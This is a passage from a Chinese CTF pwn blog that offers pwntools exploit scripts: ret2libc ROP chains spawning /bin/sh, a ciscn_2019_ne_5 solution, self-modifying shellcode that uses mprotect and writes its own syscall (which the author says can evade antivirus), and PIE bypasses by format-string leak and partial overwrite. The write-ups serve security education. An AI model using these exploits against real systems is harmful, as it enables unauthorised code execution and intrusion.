class="string">b&#x27;a&#x27;</span>*<span class="number">0x57</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">sys = libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;choice!\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;encrypted\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x57</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(sys)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="20-ciscn-2019-ne-5"><a href="#20-ciscn-2019-ne-5" class="headerlink" title="20 ciscn_2019_ne_5"></a>20 ciscn_2019_ne_5</h2><p>这个题目挺有意思的</p>
<p>ida里看到4那个选项对应的就是<code>GetFlag()</code>,里面说我们输入的log就是flag，那么我们应该先选一输入<code>system(/bin/sh)</code>,但是没找到<code>/bin/sh</code>，</p>
<h4 id="system-sh-也是可以的"><a href="#system-sh-也是可以的" class="headerlink" title="system(sh)也是可以的"></a><code>system(sh)</code>也是可以的</h4><p>这份exp是直接截断了fflush，也可以用<code>ROPgadget --binary pwn --string &quot;sh&quot;</code>来查查，确实有一个(似乎就是这一个)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x80482E6</span>+<span class="number">4</span>	<span class="comment">#0x80482E6是字符串fflush，这里对它做了一个截断，留下了sh</span></span><br><span class="line">sys_addr = <span class="number">0x80484D0</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;password:&#x27;</span>,<span class="string">b&#x27;administrator&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(sys_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(binsh)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;info:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/basic/%E8%87%AA%E6%94%B9%E5%8F%98shellcode/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Maple">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Maple">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Maple">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/04/basic/%E8%87%AA%E6%94%B9%E5%8F%98shellcode/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-04 01:34:36" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:36+08:00">2025-04-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-04-02 00:54:32" itemprop="dateModified" datetime="2025-04-02T00:54:32+08:00">2025-04-02</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="自改变shellcode"><a href="#自改变shellcode" class="headerlink" title="自改变shellcode"></a>自改变shellcode</h1><p>by Maple</p>
<p>校赛的<code>shell_for_shell</code>打破防了，但学到了一个叫做<strong>自改变shellcode</strong>的shellcode注入方式，理论来说可以实现所有的shellcode免杀，记录一下</p>
<p>先贴exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----恢复栈帧------</span></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	mov rbp, 0x404500</span></span><br><span class="line"><span class="string">    mov rsp, rbp</span></span><br><span class="line"><span class="string">    lea r15, [rip+0xe00]</span></span><br><span class="line"><span class="string">    sub r15, 0xe16</span></span><br><span class="line"><span class="string">    mov rdi, r15</span></span><br><span class="line"><span class="string">    mov rsi, 0x1000</span></span><br><span class="line"><span class="string">    mov rdx, 0x7</span></span><br><span class="line"><span class="string">    mov rax, 0x401070</span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string">    mov si, word ptr [r15 + 0x100]</span></span><br><span class="line"><span class="string">    add si, 0x101</span></span><br><span class="line"><span class="string">    mov word ptr [r15 + 0x100], si</span></span><br><span class="line"><span class="string">    push 0x68</span></span><br><span class="line"><span class="string">    mov rax, 0x732f2f2f6e69622f</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    /* push argument array [&#x27;sh\x00&#x27;] */</span></span><br><span class="line"><span class="string">    /* push b&#x27;sh\x00&#x27; */</span></span><br><span class="line"><span class="string">    push 0x1010101 ^ 0x6873</span></span><br><span class="line"><span class="string">    xor dword ptr [rsp], 0x1010101</span></span><br><span class="line"><span class="string">    xor esi, esi /* 0 */</span></span><br><span class="line"><span class="string">    push rsi /* null terminate */</span></span><br><span class="line"><span class="string">    push 8</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    add rsi, rsp</span></span><br><span class="line"><span class="string">    push rsi /* &#x27;sh\x00&#x27; */</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    xor edx, edx /* 0 */</span></span><br><span class="line"><span class="string">    /* call execve() */</span></span><br><span class="line"><span class="string">    push SYS_execve /* 0x3b */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload = (<span class="string">b&quot;\x00\xc0&quot;</span>+asm(shellcode)).ljust(<span class="number">0x100</span>-<span class="number">3</span>, <span class="string">b&quot;\x90&quot;</span>)+<span class="string">b&quot;\x0e\x04&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这边分段分析一下</p>
<h2 id="恢复栈-调用mprotect改权限"><a href="#恢复栈-调用mprotect改权限" class="headerlink" title="恢复栈+调用mprotect改权限"></a>恢复栈+调用mprotect改权限</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov rbp, 0x404500		;栈底恢复</span><br><span class="line">   mov rsp, rbp			;rbp赋给rsp，恢复栈顶</span><br><span class="line">   lea r15, [rip+0xe00]	;这里如果动调过会发现rip被保留了（其实看ida的汇编码也能看出来），就拿rip做传递栈指针</span><br><span class="line">   sub r15, 0xe16			;额外减0x16，退回最开始的地址（之前总共0x16字节的汇编程序）</span><br><span class="line">   mov rdi, r15			;rdi被传递,这里即addr = rdi</span><br><span class="line">   mov rsi, 0x1000			;len = 0x1000</span><br><span class="line">   mov rdx, 0x7			;prot = 7</span><br><span class="line">   mov rax, 0x401070		;rax = 0x401070(对应mprotecct)</span><br><span class="line">   call rax				;call mprotect指令</span><br></pre></td></tr></table></figure>

<p>这里将栈底恢复为<code>0x404500</code>(因为动调发现这里有写入权限)，而写中间值是为了方便上下增长</p>
<p><img src="/./images/image-20250401233510572.png" alt="image-20250401233510572"></p>
<h2 id="压栈构造execve的参数，准备执行shellcode"><a href="#压栈构造execve的参数，准备执行shellcode" class="headerlink" title="压栈构造execve的参数，准备执行shellcode"></a>压栈构造execve的参数，准备执行shellcode</h2><p>这里构造了<code>execve(&quot;/bin/sh&quot;,[&quot;sh&quot;,NULL],NULL)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mov si, word ptr [r15 + 0x100]	;r15的值+0x100，赋给si（rsi，16位模式)</span><br><span class="line">   add si, 0x101					;再将si加上0x101</span><br><span class="line">   mov word ptr [r15 + 0x100], si	;修改后的si存给r15+0x100的内存位置</span><br><span class="line">   /*这里是为了给后面syscall找个确定位置，顺便自加一*/</span><br><span class="line">   push 0x68						;压入&quot;h&quot;</span><br><span class="line">   mov rax, 0x732f2f2f6e69622f		;压入/bin///s到rax中</span><br><span class="line">   push rax						;压入rax中的值</span><br><span class="line">   mov rdi, rsp					;栈顶指针给rdi，作为路径字符串的地址，后面直接写入execve</span><br><span class="line"></span><br><span class="line">   push 0x1010101 ^ 0x6873			;异或的值压栈，避免显式空字节</span><br><span class="line">   xor dword ptr [rsp], 0x1010101	;异或解密栈顶4字节，得到&#x27;sh\x00&#x27;</span><br><span class="line">   xor esi, esi /* 0 */</span><br><span class="line">   push rsi 						;作为字符串的\x00</span><br><span class="line">   push 8							;压入8，后面计算‘sh\x00&#x27;字符串地址用</span><br><span class="line">   pop rsi							;将8弹给rsi</span><br><span class="line">   add rsi, rsp					;rsi=8+rsp，指向&#x27;sh\x00&#x27;</span><br><span class="line">   push rsi 						;压入sh\x00</span><br><span class="line">   mov rsi, rsp</span><br><span class="line">   xor edx, edx /* 0 */</span><br><span class="line">   /* call execve() */</span><br><span class="line">   push SYS_execve 				;等价于push 0x3b</span><br><span class="line">   pop rax							;弹给rax</span><br></pre></td></tr></table></figure>

<h2 id="写入syscall"><a href="#写入syscall" class="headerlink" title="写入syscall"></a>写入syscall</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = (<span class="string">b&quot;\x00\xc0&quot;</span>+asm(shellcode)).ljust(<span class="number">0x100</span>-<span class="number">3</span>, <span class="string">b&quot;\x90&quot;</span>)+<span class="string">b&quot;\x0e\x04&quot;</span></span><br></pre></td></tr></table></figure>

<p>这里是题目问题，先随便写一个代码在这里，消除第一字节为<code>\x00</code>的影响</p>
<p>写入了<code>\x90(nop)</code>指令填充</p>
<p>接下来<code>\x0e\x04</code>在第100字节那里了，然后就是<code>40e+101</code>返回给rsi，变成了<code>50f</code>,也就是<code>\x0f\x05</code>(syscall的机器码)</p>
<p>之后又把这个写回去，跟<code>pop rax</code>续上，执行完整的shellcode</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/basic/PIE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Maple">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Maple">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Maple">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/04/basic/PIE/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-04 01:34:36" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:36+08:00">2025-04-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-03-04 17:23:13" itemprop="dateModified" datetime="2025-03-04T17:23:13+08:00">2025-03-04</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>PIE保护</p>
<p>by Maple</p>
<h2 id="1，PIE介绍"><a href="#1，PIE介绍" class="headerlink" title="1，PIE介绍"></a>1，PIE介绍</h2><blockquote>
<p>PIE全称是position-independent  executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。</p>
</blockquote>
<p>简单来说，在开启PIE之后，你不能再查找到代码段的绝对地址了，只能看到一个地址的后四位数字。</p>
<p>这个地址并不是程序实际运行地址，而是于程序加载基址之间的偏移量。如果没有开启pie保护，程序的加载基址默认是0x400000，现在开启了PIE之后，每次运行程序的加载基址都是不同的</p>
<p><code>程序的实际运行地址=程序加载基址+程序偏移地址</code></p>
<p><strong>注意</strong>：开启pie保护之后pwngdb调试的时候不能下断点，需要通过<code>b *$rebase(offset)</code>这种方式下断点，<code>offset</code>是ida中反汇编出来的程序地址偏移量</p>
<h2 id="2-绕过方式"><a href="#2-绕过方式" class="headerlink" title="2.绕过方式"></a>2.绕过方式</h2><h3 id="2-1-格式化字符串泄露真实地址"><a href="#2-1-格式化字符串泄露真实地址" class="headerlink" title="2.1 格式化字符串泄露真实地址"></a>2.1 格式化字符串泄露真实地址</h3><blockquote>
<p>无敌的格式化字符串又一次展现了它的神力</p>
</blockquote>
<p>如果一个程序中存在格式化字符串漏洞。我们就可以配合格式化字符串漏洞将程序某个函数的真实地址泄露出来</p>
<p>直接写个exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">b&#x27;aaaa%12$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">base_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-offset <span class="comment"># offset为偏移地址，这个需要动态调试查看</span></span><br></pre></td></tr></table></figure>

<h3 id="2-2-partial-write"><a href="#2-2-partial-write" class="headerlink" title="2.2 partial write"></a>2.2 partial write</h3><blockquote>
<p>partial  write(部分写入)就是一种利用了PIE技术缺陷的bypass技术。由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的。因此通过覆盖EIP的后8或16位 (按字节写入，每字节8位)就可以快速爆破或者直接劫持EIP。</p>
</blockquote>
<p>**省流：**不管程序加载基址怎么变化，偏移量和真实地址的最后三位都是一样的</p>
<p>假设后门函数地址为<code>0x09C5</code></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + <span class="string">b&#x27;\xC5\x09&#x27;</span> <span class="comment"># 第二字节可能\x19、\x29...尝试一下</span></span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/4/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Maple</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
